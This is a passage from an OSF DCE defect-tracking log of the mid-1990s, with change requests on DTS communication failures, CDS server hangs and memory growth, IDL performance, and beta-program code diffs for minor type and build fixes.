if there was a "decrypt integrity error" like you're seeing above, but
I don't understand why DTS would be causing calls through kernel RPC
(unless it's accessing something in DFS?).

[9/29/94 public]
Arrghhh...  My brain is frazzled...  I was reading too many CRs...  The
problem Peter and Martha have seen in the last two days is the comm failure
and/or who_are_you failures above, not decrypt integrity & who_are_you
failures.  Ignore the last part of my previous comment...

[9/29/94 public]
A major progress point. 

 Running the perf test on bl-20 the following test fails with comm failure:

> root@tsunami % client 3 "ncadg_ip_udp"
> Broadcast test [3]
>   Broadcast call that should succeed...
> *** "Communications failure" exception raised

This was running from an HP client  to a 486 server, 
but the other way around has the same failure.

The CN test don't do broadcasts, and if this is the reason why
we have been seeing these failures, we need to check out
the broadcast code in DG.

[9/29/94 public]
I must be getting delirious.  The tests were run on machines
that are on seperate subnets, and our routers don't forward
broadcast packets.  Ran it again on the same host, and it works fine.
Nevermind...

[9/30/94 public]

Not to confuse the issue even further, if that's possible, but in my
BL-20 cell configured last night, I did see the decrypt integrity errors
and "who are you" failures from DTS.  There were no tests running in the cell, 
I started getting decrpypt failure messages as soon as I brought up a
dce client after configuring a split server.

[9/30/94 public]
While they may be similar in cause, the "decrypt integrity" errors are
already being tracked in CR11009.  Haven't heard of this happening in DFS
lately.  Why is it that only DTS is having these problems, when all components
are using RPC without seeing this?

HP-UX: secd dtsd   (who are you failures)
OSF/1: cdsd dtsd   (decrypt errors)
OSF/1: client dtsd ntp_provider (decrypt errors, this node got them first) 
 
The messsages were scrolling off my screen when I left last night, but
stopped about fifteen minutes after I left.  Figures.  I'm going to
re-configure the cell from scratch this morning, with BL-20 and see what 
happens.

[9/30/94 public]
Note that Mike is correct that Peters comments belong in 11009.

Dtsd shows stuff like this for several reasons:
	- It checks it status returns carefully and prints out
	  svc error messages when things don't look right.

	- It is the first-line consumer of security and cds services,
	  and does so every 2 minutes (for dts servers).  So if anything
	  is flakey in the cell, dtsd will see it and tell you about it.


Note also that the dced test case gets communication failures when run
and we are using RPC_SUPPORTED_PROTSEQS to narrow down which protocol.
The tests were run last night with CN for 21 hours, and no comm_failures
were seen.

[9/30/94 public]
Note also that a dfs system test has been running in bl-20 cell successfully
for 17 hours now and no DTS comm failures have been seen there either ...

I believe I HAVE heard people say they've seen comm failures since bl-20
but without updates to this CR, there's nothing recent to go on. Also,
people have to be careful that the comm failures are inexplicable and
unexpected (ie. nothing coredumped, no dce_shutdowns going on, etc.)
I'll let you know the minute I see one (you were worried I'm sure :-)

[10/3/94 public]
Only ??? were seen in my 4 machine, all HP, fts test 12 + 14 cell:

1994-10-02-16:01:29.066-04:00I0.614 dtsd ERROR dts dtserror dtss_service_global_
set.c 478 0x7affa060 Couldn't get remote server's principal name: Communications
 failure (dce / rpc)

In my dfs.read_write_all.main cell with 2 HPs and 1 RIOS:

1994-10-01-06:32:48.330-04:00I----- dtsd ERROR dts dtserror dtss_service_global_
set.c 478 0x7affa020 Couldn't get remote server's principal name: Communications
 failure (dce / rpc)
1994-10-01-08:35:42.506-04:00I----- dtsd ERROR dts dtsdate time_request.c 689 0x
401b7678 RPC call ClerkRequstTime() to remote server failed: Communications fail
ure (dce / rpc)
1994-10-01-12:36:53.965-04:00I----- dtsd ERROR dts dtsdate time_request.c 689 0x
401b7678 RPC call ClerkRequstTime() to remote server failed: Communications fail
ure (dce / rpc)
1994-10-01-14:37:28.361-04:00I----- dtsd ERROR dts dtserror dtss_service_global_
set.c 478 0x7affa020 Couldn't get remote server's principal name: Communications
 failure (dce / rpc)
1994-10-01-22:41:05.461-04:00I----- dtsd ERROR dts dtserror dtss_service_global_
set.c 478 0x7affa020 Couldn't get remote server's principal name: Communications
 failure (dce / rpc)
1994-10-02-06:46:59.418-04:00I----- dtsd ERROR dts dtsdate time_request.c 689 0x
401b7678 RPC call ClerkRequstTime() to remote server failed: Communications fail
ure (dce / rpc)
1994-10-02-06:47:06.298-04:00I----- dtsd ERROR dts dtserror dtss_service_global_
set.c 478 0x7affa020 Couldn't get remote server's principal name: Communications
 failure (dce / rpc)
1994-10-02-16:54:07.699-04:00I----- dtsd ERROR dts dtsdate time_request.c 689 0x
401b7678 RPC call ClerkRequstTime() to remote server failed: Communications fail
ure (dce / rpc)
1994-10-02-17:01:22.176-04:00I----- dtsd ERROR dts dtserror dtss_service_global_
set.c 478 0x7affa020 Couldn't get remote server's principal name: Communications
 failure (dce / rpc)

ie. lots! Lots of warnings and dfs comm failures w/ auth helper catatonic
messages too ... along with Time provider timeout detected messages.

Dropping to a 1 since there doesn't seem to be much you can do with this
information before the bit freeze. I am interested in the DG vs. CN results
so if you get a chance to update this CR with them, please do - thanks.

[2/5/96 public]

The last entry is more than a year old. Is there any new info available?

[2/5/96 public]
Wow, dejavu all over again :-).
We know this type of error is not still happening as described above on HPUX
and OSF/1 is no longer a reference platform.  If it were happening in 1.2.1,
(on AIX or HPUX) I'm sure they would've opened an OT for it, not realizing
that this was even here.  Given that the above people reporting failures
are no longer at the OSF, and I know I haven't seen what I mentioned above
in the last year, I'd say close this.

[2/5/96 public]
Reunion time :-)
I've removed the obsolete email addresses from the above and replaced them
with their new email addresses, to see if anybody remembers any more about
this ;^)

[2/6/96 public]
Ok, here's the comments from the original participants:

arbo> I say keep it open.  I'm not convinced it's gone yet .  You *might*
arbo> be able to convince me to lower the priority :^>.

mckeen> Well, I was just thinking a week or so ago that I hadn't seen this bug
mckeen> for over a year and that it probably could be closed as unreproducable.
mckeen> But hey, maybe you should just assign it to one of the OSF engineers
mckeen> and have them take a look at it.......

gmd> Yup - dfs bugs never die - don't you just miss those days?

But, seriously.  There's no longer any info above to go further on, and the
one final insight we did have (actually Tom had), where he discovered that
DG had unexplained timeouts, matches up with a problem we saw here at HP
during our 1.1 productiazation work with DG timeouts that has since gone away.

Seiichi, if you believe this is the same DG timeout problem that you already
fixed, then close this with a reference to what you fixed.  If not, and the
above doesn't provide any useful information anymore since it's not happening
with any current builds, then I'd suggest that you cancel it as unreproducable.



CR Number                     : 12309
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : cds
Subcomponent Name             : cdsd
Short Description             : if cds master on RIOS, the cdsd replica on HP-UX hangs at re-start.
Reported Date                 : 9/22/94
Found in Baseline             : 1.1b18
Found Date                    : 9/22/94
Severity                      : A
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[9/22/94 public]

BUILD: NB June 22, 1994

Configuration:

	HPUX: secd master, cdsd replica, dtsd
	RIOS: cdsd master, secd replica, dtsd
	OSF1: secd replica, dtsd, NTP provider

This cell configures successfully. However, at restart
the cdsd replica, on the HPUX, hangs. As a result, the
HPUX is unusable and the cell needs to be reconfigured.

(Note: I found this problem as I was trying to reproduce
some 250 plus coredumps, from cdsclerk, which filled up 
the filesystem while running system tests, on this configuration.)

[9/22/94 public]
Martha - you wouldn't by any chance have svc logs from this,
would you? Can you throw something like:
VERBOSE:FILE:/opt/dcelocal/var/svc/verbose
NOTICE:FILE:/opt/dcelocal/var/svc/notice
WARNING:FILE:/opt/dcelocal/var/svc/warning
ERROR:FILE:/opt/dcelocal/var/svc/error
FATAL:FILE:/opt/dcelocal/var/svc/fatal

into your routing file for next time? John Dugas suggested this
for me and its definitely helped in tracking things.

[9/22//94 public]

No, I do not have svc logs. John tried to set them up on the
RIOS and the dcecp log command has not returned yet :-(

I any case, I won't do more on this, I was asked to use 
the RIOS for 1.0.3 compatibility.

[9/23/94 public]

Lower the priority. Please verify if problem still exists without the 
1.0.3 RIOS.

[9/23/94 public]

I verified this again today having the cdsd master on an OSF1 
machine and the replica on an HPUX and it worked. So, I believe
that the problem has to do with having configured the cdsd master 
on a RIOS.

[9/23/94 public]
Just in case you were bored ... another one for ya.
Note that the PRIORITY is 2, for us, since we don't have the
resources to deal with this, but the SEVERITY is A.



CR Number                     : 12306
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : cdsd
Short Description             : cdsd grows in size over 48 hour testing
Reported Date                 : 9/22/94
Found in Baseline             : 1.1b18
Found Date                    : 9/22/94
Severity                      : A
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[9/22/94 public]

In running rpc.cds.3 test for 48 hours, the size of cdsd grew from 1765 blocks 
to 13831 blocks.  Some preliminary investigation suggests that the importing of binding handles may be contributing to the growth in size, but this should be 
confirmed.

[9/22/94 public]

I forgot to add that the reason for this being an A 0 is that the growth in
cdsd appears to be the main reason that we are running out of swap space on
HP trying to run the rpc.cds.3 tests

[9/22/94 public]
Just as a data point, in a newly rebooted, 4 machine cell (including 3 DFS servers, 1 client-only),
cdsd is 1586 blocks (per ps -efl output on an HP). About a day later (22 hours), it's 2387. Growth
ranges between 12 and 32 blocks per hour.

[9/23/94 public]

Suspected that the test is too aggressive on the number of imports it is doing.



CR Number                     : 12291
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : cdsclerk
Short Description             : cdsclerk reports sec_login_import_context failures
Reported Date                 : 9/21/94
Found in Baseline             : 1.1b18
Found Date                    : 9/21/94
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[9/21/94 public]

At random times the cdsclerk on a DCE client will start reporting 
sec_login_import_context failures for minutes at a time.  This has been
seen a couple of times in the last few days, but is not reliably reproducible.

The cell appears to be functional while these messages are scrolling by, a
dce.ps returns successfully.

The messages look like this:

Routine sec_login_import_context(3sec) failed : status = 387064044.
1994-09-19-14:20:34.866-04:00I0.364 cdsclerk(13163) ERROR cds general clerk_bind
.c 1339 0x00742b38
Routine sec_login_import_context(3sec) failed : status = 387064044.
1994-09-19-14:20:34.916-04:00I0.364 cdsclerk(13163) ERROR cds general clerk_bind
.c 1339 0x00742b38
Routine sec_login_import_context(3sec) failed : status = 387064044.
1994-09-19-14:20:34.956-04:00I0.364 cdsclerk(13163) ERROR cds general clerk_bind
.c 1339 0x00742b38
Routine sec_login_import_context(3sec) failed : status = 387064044.
1994-09-19-14:20:35.026-04:00I0.364 cdsclerk(13163) ERROR cds general clerk_bind
.c 1339 0x00742b38
Routine sec_login_import_context(3sec) failed : status = 387064044.
1994-09-19-14:20:35.066-04:00I0.364 cdsclerk(13163) ERROR cds general clerk_bind
.c 1339 0x00742b38
Routine sec_login_import_context(3sec) failed : status = 387064044.
1994-09-19-14:20:35.116-04:00I0.364 cdsclerk(13163) ERROR cds general clerk_bind
.c 1339 0x00742b38

The error number translates to:
 No currently established network identity for which context exists (dce / sec)

[9/23/94 public]

Not currently blocking anyone.



CR Number                     : 12289
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dts
Subcomponent Name             : dtsdate
Short Description             : dtsdate does unfriendly and uncomplete error reporting
Reported Date                 : 9/21/94
Found in Baseline             : 1.1b16
Found Date                    : 9/21/94
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[9/21/94 public]
The dtsdate command prints errors in an unfriendly manor. We all
love serviceability, but a user should never see svc headers.

    % dtsdate -bogus-option
    1994-09-21-19:54:35.016+00:00I----- dtsdate ERROR dts dtsdate dtss_service_main.c 1571 0xa44dc9a8
    Usage: dtsdate [-s] [-q] [-u] hostname [skew-seconds]

    % dtsdate host-not-running-dtsd
    1994-09-21-19:55:40.702+00:00I----- dtsdate ERROR dts dtsdate dtss_service_main.c 1661 0xa44dc9a8
    Couldn't obtain binding to remote time server acme using protocol ncacn_ip_tcp: Not registered in endpoint map (dce / rpc)
    1994-09-21-19:55:40.982+00:00I----- dtsdate ERROR dts dtsdate dtss_service_main.c 1661 0xa44dc9a8
    Couldn't obtain binding to remote time server acme using protocol ncadg_ip_udp: Not registered in endpoint map (dce / rpc)
(yes, printed twice)

    % dtsdate bogus-host-name
does not report an error.  It should.

At least when you get an error, it prints the date (in the svc message)...



CR Number                     : 12283
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : idl
Short Description             : performance issue with RPC IDL compiler
Reported Date                 : 9/21/94
Found in Baseline             : 1.0.3
Found Date                    : 9/21/94
Severity                      : B
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[9/21/94 public]
<blank lines are filled with a single '.' -- our problem>
.
We have been experiencing performance problems with 1.0.3 IDL.  We
created tests that consist of two parts, a simple server that
accepts and immediately returns from RPCs, and a simple client to
exercise the server with different types of RPCs.  The test is
configured so that it saturates the CPU.  We can provide these test
cases if required but this report is intended to raise general
concerns with 1.0.3 RPC performance.
.
In the case of plain RPC's with 0, 1K, 2K, 4K and 8K bytes of data
1.0.3 performed the same or slightly better.  In the case showqn
below (marshalling a very complicated structure) the 1.0.3
performance is much worse.  The summary appears to be that the 
1.0.3 RPC transport or marshalling of very simple data types
performance is equal or better than 1.0.2 but there is a big hit
in marshalling complicated data structures.
.
The initial results of running the test generated the following
results:
.
        Client  Server  ms/RPC
.
        1.0.2a  1.0.2a     9.3
.
        1.0.2a  1.0.3     14.3
.
        1.0.3   1.0.2a    14.3
.
        1.0.3   1.0.3     19.5
.
Transarc then discovered that there was DCE 1.1 fix for IDL
performance (OT defect 10103) that Tom Jordahl pointed us toward.
We applied this to our 1.0.3 base and reran the tests.  The
performance improved but was still worse that 1.0.2.
.
        Client  Server  ms/RPC
.
	1.0.3+ 1.0.3+	  14.3
.
These results were obtained with client and server running a
Sparc 4/75 with SunOS 4.1.3.

[9/21/94 public]
There is no further work scheduled to be done to the idl compiler for R1.1.
We are only a few days away from bit freeze.

There is also no mandate to match 1.0.2 idl performance in all cases.
And I guess the performance numbers for the 'new' idl is old news,
and some of the problems are well understood by those who have
studied it (HP, DEC).  Much of the penalty can be attributed to
the reason for the stub changes in idl: the stub code is much
smaller because it does not inline the marshalling routines, rather
it calls in to libdce (the library calls will be slower).

If you can provide OSF (or perhaps DEC for 1.2) with specific changes
that help on your platforms, the likelyhood of this getting addressed
will increase.

Lowering to a P3, and setting fixby to 1.2.



CR Number                     : 12261
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : cache
Short Description             : CACHE_PARANOID does not compile
Reported Date                 : 9/20/94
Found in Baseline             : 1.1b17
Found Date                    : 9/20/94
Severity                      : A
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[9/20/94 public]
CACHE_PARANOID doesn't compile.  John has fixes and will submit.

[9/23/94 public]

John will submit today or it goes into the unintegrated tree.

[9/23/94 public]

John agreed to put in unintegrated tree.

[10/13/94 public]
This should go in.  The debugging capablity is important for porting.
Doesn't effect code if CACHE_PARANOID switch not enabled.

[10/19/94 public]
John agreed this problem can be doc'ed.  Lowered priority.



CR Number                     : 12250
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : es
Short Description             : with no encoding check multiple params botched
Reported Date                 : 9/19/94
Found in Baseline             : 1.1b16
Found Date                    : 9/19/94
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[9/19/94 public]
When using no encoding check [ idl_es_set_attrs(eh,
IDL_ES_NO_ENCODING_CHECK, st)], and an idl-generated decoding
function that takes multiple params (eg, a data struct and a status),
The 2nd param may get a bad value stuffed into it.

I found this with dce_db_header_fetch(), which retrieves
the first part of a backing store entry:

IDL file:
    void dce_db_header_convert(
	[in]        handle_t                h,
	[in,out]    dce_db_header_t         *data,
	[out]       error_status_t          *st );

ACF file:
    [decode]  dce_db_header_convert([comm_status] st);

C code:
    ep    = (idl_byte *)content.data;
    esize = (idl_ulong_int)content.size;
    idl_es_decode_buffer(ep, esize, &eh, st);
    if (*st != error_status_ok) return;
    idl_es_set_attrs(eh, IDL_ES_NO_ENCODING_CHECK, st);
    dce_db_header_convert(eh, (void *)hdr, st);

The value that is after the "header" was stuffed into "st". 
This is from a mail message sent this week:

    dce_db_header_convert() calls rpc_ss_ndr_unmar_interp() [file is
    rpc/idl/lib/bdrui.c].  This knows that there are 2 params ("hdr" and
    "st") and has a ptr to the thing to decode.  Say that buffer is 100
    bytes and the header is 30.  When it's done doing the header (it knows
    that it's done with that first param), the pointer into the buffer is
    after the header and at the start of the object's "real" data.  It
    happily decodes the next thing into the 2nd parm.  I don't think it's
    decoding the entire object into the (smaller) header because the value
    that gets stuffed into "st" is the first value of the "real" data (in
    my 2 test cases, a u32).

(My workaround for 1.1 was to not pass the status, but use TRY/CATCH.)



CR Number                     : 12246
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : rpc
Subcomponent Name             : 
Short Description             : OSDqa09175 unused functions can be removed
Reported Date                 : 09/19/94
Found in Baseline             : 1.1
Found Date                    : 09/06/94
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[09/19/94 public]
Full Description:

Related-file:::: Problem
 DESCRIPTION:

 Our compiler pointed out the following unused code fragments in rpc/runtime:


 cnsasgsm.c : server_assoc_count_pred_rtn (replaced by macro)

 cnsassm.c : active_pred_rtn (simply unused)

 cnsclsm.c : (the following appear replaced by macros)
 		disconnected_maybe_pred_rtn,
 		disc_last_send_pred_rtn,
 		request_fault_pred_rtn,
 		response_fault_pred_rtn,
 		last_recv_frag_pred_rtn,
 		first_frag_pred_rtn



CR Number                     : 12245
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : rpc
Subcomponent Name             : 
Short Description             : OSDqa09172 call to malloc() should be cast
Reported Date                 : 09/19/94
Found in Baseline             : 1.1
Found Date                    : 09/06/94
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : rpc/runtime/rpcsvc.c
Sensitivity                   : public

[09/19/94 public]
Full Description:

Related-file:::: Problem
 DESCRIPTION:

 In rpcsvc.c, the call to malloc() should be cast.


Related-file::Added 940906 by ddts:: /build/hiosfm/RCS/dce1.1/src/rpc/runtime/./rpcsvc.c,v 7.2
 /build/hiosfm/RCS/dce1.1/src/rpc/runtime/./rpcsvc.c,v 7.2
 rusman 1994/09/06 13:52:12 +6 -3
 Reason:  OSDqa09172 (new bug)
 call to malloc() should be cast

     *** /tmp/ci.22078..rpcsvc.c.22112.1	Tue Sep  6 09:52:15 1994
     --- /tmp/rpcsvc.c.22112.2	Tue Sep  6 09:52:15 1994
     ***************
     *** 136,147 ****
            * calls RPC_DBG_PRINTF) preclude an implementation using a
            * mutex to protect a static buffer.  The potential for infinite
            * recursion precludes allocating memory using internal RPC
            * interfaces, since those interfaces call RPC_DBG_PRINTF.
            */
     !
           if( (bptr = malloc(RPC__SVC_DBG_MSG_SZ*sizeof(char))) == NULL )
           {
       	/* die horribly */
       	abort();
           }

     --- 136,150 ----
            * calls RPC_DBG_PRINTF) preclude an implementation using a
            * mutex to protect a static buffer.  The potential for infinite
            * recursion precludes allocating memory using internal RPC
            * interfaces, since those interfaces call RPC_DBG_PRINTF.
            */
     ! #ifdef hitm
     !     if( (bptr = (char *)malloc(RPC__SVC_DBG_MSG_SZ*sizeof(char))) == NULL )
     ! #else
           if( (bptr = malloc(RPC__SVC_DBG_MSG_SZ*sizeof(char))) == NULL )
     + #endif
           {
       	/* die horribly */
       	abort();
           }

[09/19/94 public]
This is wrong.  If malloc is properly declared it should NEVER have to
be cast.  Perhaps it's not properly declared?

[9/19/94 public]
While I'm thrilled to get a CR from the beta program, this one is bad for
a few more reasons.  First, if the cast was good (and it's not), this fix
says: 

  #ifdef <mymachine>
    do the right thing
  #else
    do the wrong thing
  #endif 

Second, it adds an #ifdef for a machine dependency and we don't want those,
particularly for non-reference platforms.

Tom: I say cancel.

[levy 9/19/94 public] 

A small comment: unlike other defects reported by DCE support customers,
DCE beta defects are "automatically" entered into OT. In particular, there
is none of the "regular" syseng filtering. I am quite sure (knowing the
submitter of this problem) that the conditional compilation trick used here
is just meant as a temporary annotation awaiting the "official" OSF fix.
Furthermore, while Rich points out that a properly declared malloc never
requires casting, rpcsvc.c never includes stdlib.h...

Tom: I say #include <stdlib.h>   :)



CR Number                     : 12244
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : bld
Subcomponent Name             : 
Short Description             : OSDqa09170 sams should be invoked in the standard way
Reported Date                 : 09/19/94
Found in Baseline             : 1.1
Found Date                    : 09/06/94
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : security/gssapi/Makefile
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[09/19/94 public]
Full Description:

Related-file:::: Problem
 DESCRIPTION:

 In the 2nd beta drop code:
 	the security/gssapi/Makefile file references sams via
 	${DEFTOOLBASE}sams.  Every other makefile uses ${SAMS}
 	to do this, and we think the latter is desirable in this
 	case as well.
Related-file::Added 940906 by ddts:: /build/hiosfm/RCS/dce1.1/src/security/gssapi/./Makefile,v 7.2
 /build/hiosfm/RCS/dce1.1/src/security/gssapi/./Makefile,v 7.2
 rusman 1994/09/06 13:03:25 +4 -3
 Reason:  OSDqa09170 (new bug)
 use normal method to reference sams in build

     *** /tmp/ci.21352..Makefile.21386.1	Tue Sep  6 09:03:27 1994
     --- /tmp/Makefile.21386.2	Tue Sep  6 09:03:27 1994
     ***************
     *** 43,49 ****

       .include <${RULES_MK}>


       dcegssmsg.h: gss_msgs.sms
     ! 	${DEFTOOLBASE}sams -o thmcsSu $>

     --- 43,50 ----

       .include <${RULES_MK}>


       dcegssmsg.h: gss_msgs.sms
     ! 	${SAMS} -o thmcsSu $>
     ! #	${DEFTOOLBASE}sams -o thmcsSu $>

[08/26/96 public]

Unless this really needs to be addressed for 1.2.2, I'd like to defer this.



CR Number                     : 12243
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : rpc
Subcomponent Name             : 
Short Description             : OSDqa09169 type mismatch in subroutine call
Reported Date                 : 09/19/94
Found in Baseline             : 1.1
Found Date                    : 09/06/94
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : rpc/idl_compiler/errors.c
Sensitivity                   : public

[09/19/94 public]
Full Description:

Related-file:::: Problem
 DESCRIPTION:

 In the 2nd Beta drop for DCE1.1:

 in idl/idl_compiler/errors.c, the call to log_error() contains a parameter
 of incorrect type. "text_len" is an integer, and the calling interface
 requires a char * .



Related-file::Added 940906 by ddts:: /build/hiosfm/RCS/dce1.1/src/rpc/idl/idl_compiler/./errors.c,v 7.2
 /build/hiosfm/RCS/dce1.1/src/rpc/idl/idl_compiler/./errors.c,v 7.2
 rusman 1994/09/06 12:57:21 +10 -3
 Reason:  OSDqa09169 (new bug)
 type mismatch in call to log_error()

     *** /tmp/ci.21256..errors.c.21290.1	Tue Sep  6 08:57:23 1994
     --- /tmp/errors.c.21290.2	Tue Sep  6 08:57:24 1994
     ***************
     *** 154,163 ****
     --- 154,166 ----
       #endif

       {
           boolean have_text = false;  /* True if have source text to output */
           int     text_len = 0;       /* Length of source text to output */
     + #ifdef hitm
     +     char    text_len_string[4];
     + #endif
           int     lineno;             /* Source line number of relevant text */
           long    msg_id;             /* ID of message to output */
           char    *near_text;         /* Text of object near error */
           STRTAB_str_t string_id;     /* Entry in string table of near text */

     ***************
     *** 197,208 ****
               if (feof(*yyin_p))
                   msg_id = NIDL_EOF;
               else
                   msg_id = NIDL_SYNTAXNEAR;
           }
     !
           log_error(lineno, msg_id, text_len, near_text);
       }
       
       /*
        *  y y e r r o r
        *
     --- 200,215 ----
               if (feof(*yyin_p))
                   msg_id = NIDL_EOF;
               else
                   msg_id = NIDL_SYNTAXNEAR;
           }
     ! #ifdef hitm
     !     sscanf(text_len_string,"%d",&text_len);
     !     log_error(lineno, msg_id, text_len_string, near_text);
     ! #else
           log_error(lineno, msg_id, text_len, near_text);
     + #endif
       }
       
       /*
        *  y y e r r o r
        *



CR Number                     : 12241
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : hppa
S/W Ref Platform              : hpux
Component Name                : dts
Subcomponent Name             : libutc-user
Short Description             : Inacuracy not adjusted
Reported Date                 : 9/19/94
Found in Baseline             : 1.1
Found Date                    : 9/19/94
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[9/19/94 public]

When running the test_kernel test on a platform (such as HPUX)
which uses the user-mode libutc, the following behavior is seen.

Normally (aka on OSF/1 kernel mode implementation) when the clock
is moved forward due to a leap second, the inacuaracy value
of the clock should be increased.  This does not seem to happen
with libutc-user

Sample output of test_kernel on OSF/1:

Setting time forward 1 second
Leap second set to: 1994-09-19 15:58:17.537724000 +/- 0 00:00:00.000000000 (UTC)
1994-09-19 15:58:13.537724
1994-09-19 15:58:13.537724000 +/- 0 00:00:00.011010000 (UTC)
1994-09-19 11:58:13.537724000 +/- 0 00:00:00.011010000 (GMT-4:00 = -14400)
1994-09-19 15:58:16.537724
1994-09-19 15:58:16.537724000 +/- 0 00:00:00.014010000 (UTC)
1994-09-19 11:58:16.537724000 +/- 0 00:00:00.014010000 (GMT-4:00 = -14400)
1994-09-19 15:58:19.537724
1994-09-19 15:58:19.537724000 +/- 0 00:00:01.017010000 (UTC)
1994-09-19 11:58:19.537724000 +/- 0 00:00:01.017010000 (GMT-4:00 = -14400)
1994-09-19 15:58:19.537724


Sample output of test_kernel on HP-UX:

Setting time forward 1 second
Leap second set to: 1994-09-19 15:57:15.575735000 +/- 0 00:00:00.000000000 (EST)
1994-09-19 15:57:11.601575
1994-09-19 15:57:11.601856000 +/- 0 00:00:00.011026200 (EST)
1994-09-19 11:57:11.601856000 +/- 0 00:00:00.011026200 (GMT-4:00 = -14400)
1994-09-19 15:57:14.706471
1994-09-19 15:57:14.706705000 +/- 0 00:00:00.014131000 (EST)
1994-09-19 11:57:14.706705000 +/- 0 00:00:00.014131000 (GMT-4:00 = -14400)
1994-09-19 15:57:17.706478
1994-09-19 15:57:17.706713000 +/- 0 00:00:00.017131000 (EST)
1994-09-19 11:57:17.706713000 +/- 0 00:00:00.017131000 (GMT-4:00 = -14400)
1994-09-19 15:57:17.712891


Notice is the last time stamp, the inacuracy value doesn't get incremented
when the leap second occurs.

This is probably a bug in the user mode code.



CR Number                     : 12221
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : 
Short Description             : cdsalias can be set incorrectly
Reported Date                 : 9/16/94
Found in Baseline             : 1.1
Found Date                    : 9/16/94
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[9/16/94 public]

If a pathname of the form "/.:/foo" is passed into the cds api
cp_AddCellname() the name is accepted and added into the CDS_CellAliases 
attribute. However, if the name is expanded prior to attempting to add 
it this error is returned.

Error: The supplied cellname would result in a hierarchical cycle.

[9/22/94 public]

Returning an error for this case is the correct behavior.  Accepting
"/.:/foo" as a cdsalias is bad.  As you noticed, the cp_AddCellname and
cp_RemoveCellname routines expect the supplied name to be expanded prior to
calling them.  Since this is not a public interface, and the only two
places that call them expand the name before calling them (cdscp and dcecp
(Oh, thanks for fixing this in cdscp_cellalias.c)), I'm not sure this
warrants this priority.

[9/22/94 public]

I've re-prioritized to E4 and changed the status to deferred since I
don't think we'll be changing any code.  I could add some comment
specifying that the name must be expanded before passing it to
cp_AddCellname or cp_RemoveCellname.  Re-open if you wish.



CR Number                     : 12219
Defect or Enhancement?        : enh
